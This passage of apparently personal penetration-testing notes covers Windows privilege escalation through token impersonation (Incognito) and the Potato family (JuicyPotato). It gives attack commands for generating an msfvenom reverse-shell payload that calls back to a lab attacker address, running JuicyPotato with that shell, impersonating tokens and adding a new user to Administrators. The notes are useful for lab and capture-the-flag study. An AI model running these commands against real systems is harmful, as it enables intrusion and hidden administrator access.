	- [Privileges options](https://hackersploit.org/windows-privilege-escalation-fundamentals/)
- Check potatos
	- [Potato family](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer)
	- [Incognito.exe](https://medium.com/r3d-buck3t/domain-escalation-with-token-impersonation-bc577db55a0f)

- **JUICYPOTATO**
  - extract CLSID
  - .\JuicyPotato.exe -p SCRIPT.bat -l 1234 -t * -c [{CLSID}](https://ohpe.it/juicy-potato/CLSID/)
  - msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.87 LPORT=1234 -f exe -o privesc.exe

#### Incognito
[Tips](https://medium.com/r3d-buck3t/domain-escalation-with-token-impersonation-bc577db55a0f)

- .\incognito.exe execute -c "domain\user" C:\Windows\system32\cmd.exe
- .\incognito.exe list_tokens -u

- Create user with admin:
  
```
.\incognito add_user NAME PASS
.\incognito add_localgroup_user Administrators NAME
```

#### Potato family
- [More info](https://0xaniket.medium.com/tryhackme-retro-walkthrough-b1197c3c05fb)
- Privilege **SeImpersonatePrivilege** and/or **SeAssignPrimaryTokenPrivilege**
- alwaysinstallelevated
- JuicyPotato
	- [releases](https://github.com/ohpe/juicy-potato/releases)
	- juicypotato.exe -l PORT -p REVSHELL.exe -t * -c {[FIND_CLSID](https://ohpe.it/juicy-potato/CLSID/)]}


